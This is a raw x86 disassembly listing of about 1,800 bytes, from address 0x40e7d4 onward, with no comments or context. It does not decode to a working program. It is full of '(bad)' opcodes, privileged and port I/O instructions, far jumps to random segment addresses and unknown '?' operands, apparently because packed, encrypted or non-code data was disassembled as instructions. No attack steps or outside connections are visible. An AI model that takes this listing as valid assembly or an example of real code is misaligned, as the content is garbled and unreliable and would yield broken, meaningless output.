  40e7d4:	cmp    BYTE PTR [ebx+0x2b7a349d],al
  40e7da:	les    esi,FWORD PTR [eax+0x2748da0b]
  40e7e0:	inc    DWORD PTR [edx+0x5d]
  40e7e3:	pusha  
  40e7e4:	call   0xc2310a12
  40e7e9:	clc    
  40e7ea:	fwait
  40e7eb:	sub    al,0x15
  40e7ed:	jb     0x40e80a
  40e7ef:	mov    ecx,0x813245a8
  40e7f4:	pop    ebx
  40e7f5:	nop
  40e7f6:	stc    
  40e7f7:	jecxz  0x40e814
  40e7f9:	jne    0x40e833
  40e7fb:	cmp    BYTE PTR [eax-0x61854a5e],bl
  40e801:	push   esi
  40e802:	cld    
  40e803:	mov    edi,0xa346d90a
  40e808:	pop    edx
  40e809:	or     DWORD PTR [esi+0x3dbf2ef8],0xffffffce
  40e810:	lss    ecx,FWORD PTR [ebx+0x17]
  40e814:	in     al,dx
  40e815:	jne    0x40e800
  40e817:	(bad)  
  40e819:	aam    0x9
  40e81b:	mov    edi,esp
  40e81d:	xor    eax,0xec8d611a
  40e822:	hlt    
  40e823:	data16 sti 
  40e825:	mov    bl,0xb0
  40e827:	jnp    0x40e7fb
  40e829:	cs sub eax,0xcffa9929
  40e82f:	je     0x40e84f
  40e831:	fwait
  40e832:	(bad)  
  40e833:	jbe    0x40e7f0
  40e835:	and    al,0xf7
  40e837:	imul   DWORD PTR ds:0xea38a10a
  40e83d:	rcl    BYTE PTR [esi+0x7201ea7a],1
  40e843:	xor    BYTE PTR [ecx-0x5ee5551e],dl
  40e849:	std    
  40e84a:	aad    0xa7
  40e84c:	fdivr  QWORD PTR [ebx]
  40e84e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e84f:	imul   ebp,DWORD PTR [edi+0x6c],0x17
  40e853:	add    DWORD PTR [ebx],ebx
  40e855:	lds    ecx,FWORD PTR [esi-0x16e7baa7]
  40e85b:	test   esp,esp
  40e85d:	xor    eax,0x943e257a
  40e862:	jne    0x40e86a
  40e864:	(bad)  
  40e865:	fs scas al,BYTE PTR es:[edi]
  40e867:	enter  0x2903,0x14
  40e86b:	jno    0x40e8dc
  40e86d:	int    0xcd
  40e86f:	shr    BYTE PTR [edi-0x6a],0x2c
  40e873:	loopne 0x40e89a
  40e875:	aaa    
  40e876:	into   
  40e877:	mov    ds:0xce296d91,eax
  40e87c:	add    eax,0xc6c952bd
  40e881:	int3   
  40e882:	inc    ebx
  40e883:	sar    BYTE PTR [edx+0x6623f15b],cl
  40e889:	jo     0x40e8cb
  40e88b:	int    0x2d
  40e88d:	in     eax,0x1
  40e88f:	icebp  
  40e890:	or     al,0x78
  40e892:	and    eax,0xc0ec5acc
  40e898:	mov    ah,0xbc
  40e89a:	sub    DWORD PTR [ebp-0x16],edi
  40e89d:	or     al,0x3f
  40e89f:	push   0x4761d46b
  40e8a4:	call   0xf0aa63e1
  40e8a9:	cld    
  40e8aa:	push   cs
  40e8ab:	push   eax
  40e8ac:	push   ebp
  40e8ad:	jecxz  0x40e8ce
  40e8af:	push   edx
  40e8b0:	iret   
  40e8b1:	retf   0x6129
  40e8b4:	popf   
  40e8b5:	mov    esi,0xb9631ec5
  40e8ba:	mov    bh,BYTE PTR ds:0x51da5b21
  40e8c0:	sub    BYTE PTR [edx],dl
  40e8c2:	rcl    BYTE PTR [esi-0x13a1ae08],cl
  40e8c8:	inc    edi
  40e8c9:	jne    0x40e8ca
  40e8cb:	shr    BYTE PTR [esi],cl
  40e8cd:	or     BYTE PTR [eax-0x69],bh
  40e8d0:	loop   0x40e8c1
  40e8d2:	adc    BYTE PTR [ebx-0x4644e371],0x67
  40e8d9:	in     al,0x8d
  40e8db:	fucomi st,st(1)
  40e8dd:	mov    edi,0xc0125bd1
  40e8e2:	jae    0x40e8c3
  40e8e4:	jne    0x40e8a8
  40e8e6:	(bad)  
  40e8e7:	lods   al,BYTE PTR ds:[esi]
  40e8e8:	inc    edi
  40e8e9:	inc    ebx
  40e8ea:	clc    
  40e8eb:	retf   0xc04f
  40e8ee:	ds cmp eax,0x7c2e9f9e
  40e8f4:	push   ds
  40e8f5:	jecxz  0x40e907
  40e8f7:	mov    ds:0x774eb978,eax
  40e8fc:	(bad)  
  40e8fd:	lods   al,BYTE PTR ds:[esi]
  40e8fe:	pop    edx
  40e8ff:	mov    ds:0x2badc4fc,eax
  40e904:	pop    esp
  40e905:	std    
  40e906:	sbb    edi,edi
  40e908:	mov    ah,0x2d
  40e90a:	push   0x3d06e5dd
  40e90f:	int    0x71
  40e911:	lahf   
  40e912:	ja     0x40e956
  40e914:	fucomi st,st(6)
  40e916:	and    al,0x69
  40e918:	push   ecx
  40e919:	repz retf 0x3256
  40e91d:	fwait
  40e91e:	iret   
  40e91f:	repnz loopne 0x40e8ea
  40e922:	adc    al,0xe2
  40e924:	inc    esi
  40e925:	cmp    BYTE PTR [edi+ebp*1+0x6f],bl
  40e929:	pop    ebp
  40e92a:	push   ax
  40e92c:	cs push eax
  40e92e:	dec    esp
  40e92f:	jmp    0xfd43:0x4764a571
  40e936:	xor    al,0x8f
  40e938:	outs   dx,DWORD PTR ds:[esi]
  40e939:	mov    cl,BYTE PTR [eax]
  40e93b:	pop    es
  40e93c:	cmp    ebx,DWORD PTR [ecx+0x29]
  40e93f:	leave  
  40e940:	inc    esi
  40e941:	inc    edi
  40e942:	test   al,0x85
  40e944:	pop    es
  40e945:	scas   al,BYTE PTR es:[edi]
  40e946:	ins    DWORD PTR es:[edi],dx
  40e947:	pop    esp
  40e948:	in     eax,0x9a
  40e94a:	jb     0x40e8dc
  40e94c:	inc    ebx
  40e94d:	retf   0x2d28
  40e950:	pop    ds
  40e951:	adc    eax,0x6472f3d6
  40e956:	inc    esp
  40e957:	xchg   edx,eax
  40e958:	add    edi,DWORD PTR [ebp+0xc]
  40e95b:	push   ebx
  40e95c:	pop    ebp
  40e95d:	sub    DWORD PTR [esi],0x38d5f8a8
  40e963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e964:	dec    ebx
  40e965:	or     al,0xa2
  40e967:	xor    edi,esi
  40e969:	jle    0x40e960
  40e96b:	push   0x34
  40e96d:	xchg   DWORD PTR ds:0x2322fda1,edi
  40e973:	mov    esp,0x3774cc42
  40e978:	sbb    cl,BYTE PTR [eax+0x10]
  40e97b:	xchg   ebx,eax
  40e97c:	int    0x76
  40e97e:	les    esp,FWORD PTR [eax-0x42]
  40e981:	dec    ecx
  40e982:	jno    0x40e9aa
  40e984:	and    dl,BYTE PTR [edx]
  40e986:	popa   
  40e987:	push   ds
  40e988:	xor    BYTE PTR [edi-0x89cf3db],dl
  40e98e:	push   0x17d5592c
  40e993:	dec    ebx
  40e994:	sub    al,0x6f
  40e996:	nop
  40e997:	inc    edi
  40e998:	and    ebp,ecx
  40e99a:	xchg   esi,eax
  40e99b:	xor    BYTE PTR [ebx-0x2716bd35],0xd8
  40e9a2:	jb     0x40ea0d
  40e9a4:	push   esi
  40e9a5:	(bad)  
  40e9a6:	sbb    ebp,eax
  40e9a8:	cmp    edx,DWORD PTR [ecx]
  40e9aa:	shl    BYTE PTR [edi-0x3ab80f7c],1
  40e9b0:	inc    esi
  40e9b1:	out    dx,al
  40e9b2:	lahf   
  40e9b3:	js     0x40e9f3
  40e9b5:	inc    ecx
  40e9b6:	add    BYTE PTR [eax+0xe],dl
  40e9b9:	loope  0x40e99d
  40e9bb:	adc    DWORD PTR [edx+edi*1+0x57],ecx
  40e9bf:	popa   
  40e9c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9c1:	ret    0xe42b
  40e9c4:	enter  0x740e,0xbb
  40e9c8:	test   BYTE PTR [esi+0x15],ch
  40e9cb:	rcl    DWORD PTR [ecx-0x7bd44e9e],1
  40e9d1:	pop    ecx
  40e9d2:	cld    
  40e9d3:	xor    bl,BYTE PTR [ebx-0x58]
  40e9d6:	jno    0x40ea12
  40e9d8:	cmc    
  40e9d9:	daa    
  40e9da:	pop    ds
  40e9db:	lods   eax,DWORD PTR ds:[esi]
  40e9dc:	into   
  40e9dd:	test   BYTE PTR [esp+ebp*2-0x71c49213],dl
  40e9e4:	aam    0x11
  40e9e6:	add    ch,ch
  40e9e8:	jns    0x40ea64
  40e9ea:	pop    eax
  40e9eb:	cmp    BYTE PTR [ebp+0x22819764],cl
  40e9f1:	mov    bl,0x4d
  40e9f3:	lods   al,BYTE PTR ds:[esi]
  40e9f4:	add    al,0x4c
  40e9f6:	pop    ebp
  40e9f7:	push   ds
  40e9f8:	sar    DWORD PTR [ecx],0x8
  40e9fb:	lock push ecx
  40e9fd:	push   edx
  40e9fe:	mov    BYTE PTR [edi],ah
  40ea00:	jno    0x40e9de
  40ea02:	xor    DWORD PTR [edx-0x7c],0x64ae1723
  40ea09:	xchg   ebp,eax
  40ea0a:	int    0xc1
  40ea0c:	and    eax,0xa52f6e55
  40ea11:	sub    eax,0x55b38cf1
  40ea16:	outs   dx,DWORD PTR ds:[esi]
  40ea17:	hlt    
  40ea18:	ins    DWORD PTR es:[edi],dx
  40ea19:	or     eax,0x3c2d3d4
  40ea1e:	mov    edx,DWORD PTR [esi+ebp*4-0x6d]
  40ea22:	sbb    eax,0x863e0445
  40ea27:	dec    ebx
  40ea28:	mov    bh,0x36
  40ea2a:	pop    ss
  40ea2b:	sub    al,0x75
  40ea2d:	sbb    DWORD PTR [ecx],esi
  40ea2f:	xchg   esi,eax
  40ea30:	jle    0x40e9c3
  40ea32:	(bad)  
  40ea33:	popf   
  40ea34:	rcl    BYTE PTR [edx+ebx*2],cl
  40ea37:	scas   al,BYTE PTR es:[edi]
  40ea38:	sub    eax,0xc4c5d5e4
  40ea3d:	loope  0x40eab3
  40ea3f:	xchg   edx,eax
  40ea40:	test   eax,0x4388a71b
  40ea45:	cdq    
  40ea46:	inc    ebx
  40ea47:	adc    al,0xfb
  40ea49:	push   esi
  40ea4a:	ficomp DWORD PTR [ebx]
  40ea4c:	out    0x4a,al
  40ea4e:	or     eax,0xf56bf44d
  40ea53:	jp     0x40ea7f
  40ea55:	push   eax
  40ea56:	push   es
  40ea57:	mov    cl,0x3
  40ea59:	xchg   edx,eax
  40ea5a:	jae    0x40ea59
  40ea5c:	iret   
  40ea5d:	inc    esi
  40ea5e:	fnstenv [eax-0x1a502b07]
  40ea64:	(bad)  
  40ea65:	or     al,0x45
  40ea67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea69:	jge    0x40ea82
  40ea6b:	push   esp
  40ea6c:	and    DWORD PTR [esi+ebx*2-0x69],ebp
  40ea70:	test   al,0x78
  40ea72:	jmp    0xa5deb823
  40ea77:	pop    ecx
  40ea78:	(bad)  
  40ea79:	or     ch,BYTE PTR [esi]
  40ea7b:	adc    BYTE PTR [ecx+0x3b068ec3],cl
  40ea81:	mov    ebp,0xe299a8d0
  40ea86:	mov    edx,0xa74690f0
  40ea8b:	das    
  40ea8c:	lock pop esi
  40ea8e:	inc    esp
  40ea8f:	mov    ds:0x559ebc46,eax
  40ea94:	icebp  
  40ea95:	inc    esp
  40ea96:	or     ah,dl
  40ea98:	iret   
  40ea99:	popa   
  40ea9a:	add    al,0x1f
  40ea9c:	scas   eax,DWORD PTR es:[edi]
  40ea9d:	mov    al,ds:0xc79531dc
  40eaa2:	pop    DWORD PTR [ecx]
  40eaa4:	pusha  
  40eaa5:	dec    edi
  40eaa6:	inc    esi
  40eaa7:	xchg   edi,eax
  40eaa8:	je     0x40ea97
  40eaaa:	jecxz  0x40eaab
  40eaac:	clc    
  40eaad:	or     ebp,eax
  40eaaf:	push   eax
  40eab0:	lock cdq 
  40eab2:	ins    DWORD PTR es:[edi],dx
  40eab3:	loopne 0x40eac2
  40eab5:	push   0x51eacaaf
  40eaba:	sahf   
  40eabb:	jp     0x40ea3f
  40eabd:	adc    al,0xea
  40eabf:	mov    BYTE PTR [ebp-0x6f],ah
  40eac2:	mov    WORD PTR [edx],?
  40eac4:	pushf  
  40eac5:	imul   ebp,DWORD PTR [esi],0x61
  40eac8:	fxch   st(1)
  40eaca:	gs jecxz 0x40eaf1
  40eacd:	popf   
  40eace:	xlat   BYTE PTR ds:[ebx]
  40eacf:	loop   0x40ea5e
  40ead1:	jnp    0x40ead5
  40ead3:	stos   DWORD PTR es:[edi],eax
  40ead4:	pop    es
  40ead5:	rol    DWORD PTR [esi+0x40d4a659],cl
  40eadb:	lods   eax,DWORD PTR ds:[esi]
  40eadd:	mov    cl,0x61
  40eadf:	out    0xcd,eax
  40eae1:	add    DWORD PTR [edx-0x4c],esp
  40eae4:	xchg   esi,eax
  40eae5:	out    0xd3,eax
  40eae7:	aad    0x88
  40eae9:	xchg   ecx,eax
  40eaea:	and    DWORD PTR [edx-0xe071645],0x176bc6d
  40eaf4:	pop    ebp
  40eaf5:	retf   0x6f34
  40eaf8:	mov    ah,0xd7
  40eafa:	jae    0x40eac9
  40eafc:	dec    ebp
  40eafd:	int3   
  40eafe:	adc    eax,eax
  40eb00:	push   ss
  40eb01:	or     eax,0x796a4b9f
  40eb06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb07:	xchg   edi,eax
  40eb08:	out    0xd6,al
  40eb0a:	xlat   BYTE PTR ds:[ebx]
  40eb0b:	je     0x40eaab
  40eb0d:	mov    cl,0xf8
  40eb0f:	sub    cl,BYTE PTR [edi-0x68dc3b4f]
  40eb15:	push   edi
  40eb16:	inc    edi
  40eb17:	or     edx,ebx
  40eb19:	fdiv   QWORD PTR [eax+0x3f05582f]
  40eb1f:	and    esi,DWORD PTR [edi]
  40eb21:	outs   dx,BYTE PTR ds:[esi]
  40eb22:	adc    BYTE PTR [edx-0x7e814ba9],bl
  40eb28:	jmp    0x6325:0xbf495b46
  40eb2f:	mov    edx,0x2420f8ba
  40eb34:	aad    0xfb
  40eb36:	add    bh,BYTE PTR [ebp+0xc]
  40eb39:	pop    ebp
  40eb3a:	rcl    BYTE PTR [ebp-0x6b],cl
  40eb3d:	mov    ecx,0xe7efda46
  40eb42:	dec    eax
  40eb43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb44:	push   edx
  40eb45:	inc    edx
  40eb46:	inc    edx
  40eb47:	add    BYTE PTR [eax],0x19
  40eb4a:	or     dl,ah
  40eb4c:	test   BYTE PTR [ecx],0x1c
  40eb4f:	xchg   DWORD PTR [esi+eax*2-0x57],esp
  40eb53:	jecxz  0x40eb1e
  40eb55:	(bad)  
  40eb58:	dec    esi
  40eb59:	jne    0x40eaff
  40eb5b:	mov    al,ds:0x8aa71272
  40eb60:	xchg   esp,eax
  40eb61:	dec    esp
  40eb62:	test   esp,ecx
  40eb64:	sbb    eax,0x5d4ebece
  40eb69:	mov    ds:0xf589c74b,al
  40eb6e:	jge    0x40eb0b
  40eb70:	sbb    BYTE PTR [ebp-0x723b62b7],ch
  40eb76:	(bad)  
  40eb77:	std    
  40eb78:	mov    ebx,0xc0090ade
  40eb7d:	pop    ebx
  40eb7e:	jl     0x40ebc9
  40eb80:	lods   eax,DWORD PTR ds:[esi]
  40eb81:	lods   eax,DWORD PTR ds:[esi]
  40eb82:	jnp    0x40ebfe
  40eb84:	xor    DWORD PTR [ebp+0x4b],esi
  40eb87:	adc    al,0x93
  40eb89:	test   eax,0x2b74bced
  40eb8e:	cmp    ebp,ebx
  40eb90:	pop    ss
  40eb91:	sub    edx,DWORD PTR [ebx+edi*1-0x2b]
  40eb95:	push   0xaa162432
  40eb9a:	add    eax,0xc3b53792
  40eb9f:	lods   al,BYTE PTR ds:[esi]
  40eba0:	mov    bh,0x4e
  40eba2:	mov    bl,0x18
  40eba4:	jecxz  0x40eb30
  40eba6:	dec    BYTE PTR [edx+0x6e7dc7cd]
  40ebac:	in     eax,0x48
  40ebae:	push   ebx
  40ebb0:	sub    al,0x47
  40ebb2:	imul   esi,DWORD PTR [edi+0x4cd9508e],0xffffffed
  40ebb9:	inc    ebx
  40ebba:	push   ss
  40ebbb:	and    BYTE PTR [edx-0x4e],bh
  40ebbe:	push   esp
  40ebbf:	xchg   esp,eax
  40ebc0:	mov    ds:0x43a2f965,eax
  40ebc5:	pop    esp
  40ebc6:	jp     0x40ebd4
  40ebc8:	mov    al,ds:0xaabb438b
  40ebcd:	es add edx,0xffffffb3
  40ebd1:	and    DWORD PTR [esi-0x3d59bc72],eax
  40ebd7:	jmp    DWORD PTR [eax-0xcee5932]
  40ebdd:	arpl   WORD PTR [ebx+0x6eaec6db],cx
  40ebe3:	in     eax,0x41
  40ebe5:	int3   
  40ebe6:	adc    BYTE PTR [eax+0x3dfa8798],bh
  40ebec:	mov    cl,0x9f
  40ebee:	sahf   
  40ebef:	ffree  st(3)
  40ebf1:	inc    eax
  40ebf2:	pop    ss
  40ebf3:	mov    ds:0x9cae81f9,al
  40ebf8:	test   al,0x17
  40ebfa:	cmovnp edi,DWORD PTR [ebx+0x1c17990b]
  40ec01:	dec    esi
  40ec02:	dec    edi
  40ec03:	xor    ah,ah
  40ec05:	push   ecx
  40ec06:	mov    dh,0x32
  40ec08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec09:	ret    
  40ec0a:	icebp  
  40ec0b:	push   cs
  40ec0c:	push   ebx
  40ec0d:	shl    ch,0xa
  40ec10:	ret    0xd9fe
  40ec13:	pop    ss
  40ec14:	push   cs
  40ec15:	cmp    edx,DWORD PTR [eax+0x50]
  40ec18:	clc    
  40ec19:	pushf  
  40ec1a:	retf   0x85ba
  40ec1d:	inc    ebp
  40ec1e:	add    al,0x5c
  40ec20:	in     al,0x97
  40ec22:	std    
  40ec23:	pushf  
  40ec24:	loopne 0x40ebf1
  40ec26:	or     ah,ah
  40ec28:	push   eax
  40ec29:	dec    esp
  40ec2a:	jp     0x40ec43
  40ec2c:	scas   eax,DWORD PTR es:[edi]
  40ec2d:	ret    
  40ec2e:	cmp    al,0x94
  40ec31:	mov    WORD PTR [esi],cs
  40ec33:	aad    0x4d
  40ec35:	cmp    eax,0x1199436f
  40ec3a:	popa   
  40ec3b:	lea    eax,[eax]
  40ec3d:	lds    eax,FWORD PTR [ecx]
  40ec3f:	outs   dx,BYTE PTR ds:[esi]
  40ec40:	pusha  
  40ec41:	cmc    
  40ec42:	sbb    eax,0xe0b07047
  40ec47:	xor    al,0xbe
  40ec49:	inc    ebp
  40ec4a:	std    
  40ec4b:	pop    ecx
  40ec4c:	les    ebx,FWORD PTR [esi+0x71cfda23]
  40ec52:	je     0x40ecaa
  40ec54:	cli    
  40ec55:	das    
  40ec56:	xchg   esp,eax
  40ec57:	xor    edx,edi
  40ec59:	jge    0x40ec58
  40ec5b:	cld    
  40ec5c:	mov    esi,0xe2ea5ddb
  40ec61:	xor    DWORD PTR [esi+0x4120fbf7],ecx
  40ec67:	into   
  40ec68:	xchg   esi,eax
  40ec69:	clc    
  40ec6a:	int    0x19
  40ec6c:	mov    bl,0x10
  40ec6e:	into   
  40ec6f:	fldcw  WORD PTR [edi-0x2a]
  40ec72:	aaa    
  40ec73:	cdq    
  40ec74:	daa    
  40ec75:	mov    cl,0xfe
  40ec77:	in     eax,0x9e
  40ec79:	push   esp
  40ec7a:	xor    BYTE PTR [ebp+eax*8-0x37],dl
  40ec7e:	and    al,0xa0
  40ec80:	adc    DWORD PTR [ebp+0x41],esp
  40ec83:	aaa    
  40ec84:	sub    eax,0x88d33768
  40ec89:	sub    DWORD PTR [ecx-0x1b601085],edx
  40ec8f:	ins    BYTE PTR es:[edi],dx
  40ec90:	jecxz  0x40ec9f
  40ec92:	or     ecx,edi
  40ec94:	jno    0x40ecf4
  40ec96:	fld    DWORD PTR [esi]
  40ec98:	imul   ebp,DWORD PTR [ebx*1+0x294cec7b],0xffffffde
  40eca0:	jnp    0x40eca5
  40eca2:	pop    eax
  40eca3:	neg    BYTE PTR [edx-0x44]
  40eca6:	xor    ebp,ecx
  40eca8:	adc    BYTE PTR [eax],0xa0
  40ecab:	data16 lahf 
  40ecad:	(bad)  
  40ecae:	sbb    DWORD PTR [edx-0xf],eax
  40ecb1:	shl    bh,1
  40ecb3:	test   bl,dh
  40ecb5:	out    0xdd,eax
  40ecb7:	ja     0x40ed24
  40ecb9:	inc    ebp
  40ecba:	push   cs
  40ecbb:	hlt    
  40ecbc:	mov    esp,0xfe0dc695
  40ecc1:	test   DWORD PTR [edx-0x5b8b7fe8],eax
  40ecc7:	iret   
  40ecc8:	pusha  
  40ecc9:	cmp    al,0x63
  40eccb:	sbb    BYTE PTR [ecx+0x96f037f],bh
  40ecd1:	dec    esp
  40ecd2:	cmc    
  40ecd3:	sar    BYTE PTR [ecx+edx*4+0x37],cl
  40ecd7:	jno    0x40ec67
  40ecd9:	aad    0x57
  40ecdb:	ja     0x40ec6a
  40ecdd:	xchg   ebx,eax
  40ecde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecdf:	std    
  40ece0:	fld    DWORD PTR es:[ecx+0x5b499a30]
  40ece7:	jmp    0x597007af
  40ecec:	retf   
  40eced:	adc    al,0x41
  40ecef:	fcom   QWORD PTR [edx+0x2480e9c1]
  40ecf5:	ds add ebx,ecx
  40ecf8:	fdivr  st,st(6)
  40ecfa:	mov    edi,0xacb8c90c
  40ecff:	pop    eax
  40ed00:	call   0xd8e5802
  40ed05:	and    dl,ch
  40ed07:	gs jns 0x40ed7b
  40ed0a:	mov    eax,0xad9a141c
  40ed0f:	pop    edi
  40ed10:	xchg   esi,eax
  40ed11:	sbb    al,ah
  40ed13:	mov    edi,eax
  40ed15:	add    eax,0x779dc012
  40ed1a:	mov    edx,0x23f5147d
  40ed1f:	ss std 
  40ed21:	push   esp
  40ed22:	cmp    al,BYTE PTR [edi-0x17]
  40ed25:	cmp    ebx,ebx
  40ed27:	loope  0x40ed53
  40ed29:	adc    BYTE PTR [ecx+0x47],dl
  40ed2c:	jmp    0xd61c066f
  40ed31:	inc    ebx
  40ed32:	adc    DWORD PTR [esi],eax
  40ed34:	dec    ecx
  40ed35:	and    DWORD PTR [ebp-0x57],esi
  40ed38:	(bad)  
  40ed39:	fist   WORD PTR [esi-0x530027a5]
  40ed3f:	push   esi
  40ed40:	int    0xf6
  40ed42:	out    dx,al
  40ed43:	jb     0x40ecec
  40ed45:	fisub  DWORD PTR [ecx+ebx*2+0x68]
  40ed49:	jle    0x40eda6
  40ed4b:	dec    esp
  40ed4c:	add    ch,BYTE PTR [edx-0x46]
  40ed4f:	push   ebp
  40ed50:	inc    ebx
  40ed51:	bound  esi,QWORD PTR [ebx-0xc40f786]
  40ed57:	pushf  
  40ed58:	push   ebx
  40ed59:	add    bh,BYTE PTR ds:0x24614246
  40ed5f:	sub    eax,0x10ae87f2
  40ed64:	cmp    eax,0x7edda49f
  40ed69:	xchg   esi,eax
  40ed6a:	pushf  
  40ed6b:	mov    ch,0x77
  40ed6d:	icebp  
  40ed6e:	jmp    0xfaa8d1c7
  40ed73:	add    eax,0xb7edfcc6
  40ed78:	sub    ebp,esi
  40ed7a:	lock sbb DWORD PTR [ebx-0x45e6e920],esp
  40ed81:	leave  
  40ed82:	ds cwde 
  40ed84:	jnp    0x40ed62
  40ed86:	xchg   ecx,eax
  40ed87:	data16 aad 0xe1
  40ed8a:	xor    BYTE PTR [edx+0x7233cbcc],dh
  40ed90:	adc    BYTE PTR [ebp+0x3a],ah
  40ed93:	aam    0x86
  40ed95:	aaa    
  40ed96:	mov    ss,WORD PTR [ecx+0x54]
  40ed99:	adc    esp,DWORD PTR [eax+edi*4+0x6d]
  40ed9d:	and    eax,0x9b353c23
  40eda2:	sar    DWORD PTR [edi+0x6d],0x4f
  40eda6:	adc    ah,bl
  40eda8:	aam    0x55
  40edaa:	inc    ebp
  40edab:	cs mov ecx,0xf9e2aa3f
  40edb1:	inc    ebx
  40edb2:	push   ecx
  40edb3:	push   es
  40edb4:	adc    eax,0x9e45cbf8
  40edb9:	leave  
  40edba:	cmp    al,0xc7
  40edbc:	push   edi
  40edbd:	aas    
  40edbe:	mov    ?,WORD PTR [eax-0x7a]
  40edc1:	pop    ebx
  40edc2:	inc    esp
  40edc3:	aad    0xad
  40edc5:	hlt    
  40edc6:	stos   BYTE PTR es:[edi],al
  40edc7:	xchg   esi,eax
  40edc8:	in     al,dx
  40edc9:	sub    dh,bl
  40edcb:	adc    BYTE PTR ds:0xaf13b1d1,al
  40edd1:	and    DWORD PTR [edx+0x6b014549],esi
  40edd7:	leave  
  40edd8:	(bad)  
  40edd9:	out    0x28,eax
  40eddb:	test   al,0x79
  40eddd:	mov    al,ds:0xb9f9d207
  40ede2:	adc    dh,ch
  40ede4:	scas   al,BYTE PTR es:[edi]
  40ede5:	xchg   ecx,eax
  40ede6:	hlt    
  40ede7:	jo     0x40ee26
  40ede9:	or     al,0xe6
  40edeb:	cmp    eax,0x28f438ba
  40edf0:	mov    esi,0xea47c357
  40edf5:	xchg   edi,eax
  40edf6:	ins    DWORD PTR es:[edi],dx
  40edf7:	test   al,0x91
  40edf9:	pop    edx
  40edfa:	push   0x44
  40edfc:	lea    esi,[edi]
  40edfe:	xchg   edx,eax
  40edff:	sub    DWORD PTR [ebp+0x480a2901],esp
  40ee05:	mov    ebp,0xfec5fa4f
  40ee0a:	xchg   edx,eax
  40ee0b:	sahf   
  40ee0c:	repnz jecxz 0x40edc1
  40ee0f:	push   ss
  40ee10:	and    eax,0xc9e32eef
  40ee15:	push   edi
  40ee16:	out    0xa2,eax
  40ee18:	pushf  
  40ee19:	and    edx,DWORD PTR [ebx]
  40ee1b:	bound  edx,QWORD PTR [ecx-0x40133d04]
  40ee21:	(bad)  [eax]
  40ee23:	pop    ss
  40ee24:	xor    ebp,eax
  40ee26:	jp     0x40ee9a
  40ee28:	push   esi
  40ee29:	ja     0x40ee22
  40ee2b:	add    eax,0x41d52817
  40ee30:	test   BYTE PTR [edi+0x4dac37ac],dh
  40ee36:	pusha  
  40ee37:	rcr    DWORD PTR [eax+0x26388c27],cl
  40ee3d:	mov    esi,DWORD PTR [ecx-0x62]
  40ee40:	pop    ebx
  40ee41:	mov    edx,0xbef62001
  40ee46:	ins    BYTE PTR es:[edi],dx
  40ee47:	ins    DWORD PTR es:[edi],dx
  40ee48:	sbb    esp,ebp
  40ee4a:	xchg   ebp,eax
  40ee4b:	std    
  40ee4c:	sbb    ecx,0x2
  40ee4f:	(bad)  
  40ee50:	sub    DWORD PTR [ebx-0x1f29b8b6],esp
  40ee56:	inc    esp
  40ee57:	mov    WORD PTR [ebx],?
  40ee59:	ficom  WORD PTR [esi+0x4f]
  40ee5c:	cdq    
  40ee5d:	ja     0x40edf0
  40ee5f:	adc    esp,ecx
  40ee61:	in     al,dx
  40ee62:	fadd   st(3),st
  40ee64:	pop    ecx
  40ee65:	push   0x67
  40ee67:	pop    ds
  40ee68:	adc    eax,0xcdfcdd10
  40ee6d:	(bad)  
  40ee6e:	adc    bh,BYTE PTR [ecx]
  40ee70:	mov    bh,0x8
  40ee72:	inc    esi
  40ee73:	fadd   QWORD PTR [edi]
  40ee75:	sub    eax,0x11b420fb
  40ee7a:	ret    0xdbd8
  40ee7d:	adc    edi,DWORD PTR [ecx-0x32]
  40ee80:	cwde   
  40ee81:	aas    
  40ee82:	(bad)  
  40ee83:	out    dx,al
  40ee84:	jl     0x40ee98
  40ee86:	xor    eax,0x3caabc37
  40ee8b:	fimul  WORD PTR [esi-0x2e1d6f45]
  40ee91:	mov    dh,0x3c
  40ee93:	std    
  40ee94:	pop    esi
  40ee95:	xor    DWORD PTR [ecx+0x7ca2bd84],ebx
  40ee9b:	shl    dl,cl
  40ee9d:	(bad)  
  40ee9f:	and    BYTE PTR [ecx],ch
  40eea1:	xor    DWORD PTR [ecx-0x56],edi
  40eea4:	lds    edi,FWORD PTR [edx-0x5e738e1d]
  40eeaa:	xor    eax,0xe9f9e94
  40eeaf:	xor    eax,0x8dab0999
  40eeb4:	cmp    al,0x75
  40eeb6:	inc    esp
  40eeb7:	(bad)  
  40eeb8:	rcr    ebp,cl
  40eeba:	mov    gs,WORD PTR [ebx-0x5b67f17c]
  40eec0:	sub    dh,BYTE PTR [eax+0x2e]
  40eec3:	call   0x6799:0x2e0d5046
  40eeca:	sahf   
  40eecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eecc:	nop
  40eecd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eece:	jmp    0x1068:0x97f938e3
  40eed5:	shl    DWORD PTR [edx],0x7
  40eed8:	stc    
  40eed9:	push   cs
  40eeda:	dec    ebp
  40eedb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eedc:	jns    0x40ef4b
  40eede:	mov    eax,ds:0x8d2640d5
  40eee3:	add    eax,0xbba0e62d
  40eee8:	dec    ebx
  40eee9:	sbb    dh,bl
  40eeeb:	ret    0x5c1c
  40eeee:	out    0xd4,al
  40eef0:	shl    DWORD PTR [ecx-0x48a49ac5],1
  40eef6:	jo     0x40ef6d
  40eef8:	sub    eax,edi
  40eefa:	out    dx,al
  40eefb:	sub    al,0xfc
  40eefd:	sub    DWORD PTR ds:0xf3a1836f,ecx
  40ef03:	ret    0x2ca9
  40ef06:	and    ebp,DWORD PTR [eax+0x70aff72b]
  40ef0c:	cmp    al,0x5f
  40ef0e:	jno    0x40ef23
  40ef10:	push   eax
  40ef11:	inc    esi
  40ef12:	add    DWORD PTR [eax],ebp
  40ef14:	xlat   BYTE PTR ds:[ebx]
  40ef15:	xchg   esp,eax
  40ef16:	inc    edx
  40ef17:	hlt    
  40ef18:	out    dx,al
  40ef19:	cwde   
  40ef1a:	repz iret 
  40ef1c:	push   edx
  40ef1d:	cmp    edx,DWORD PTR [eax]
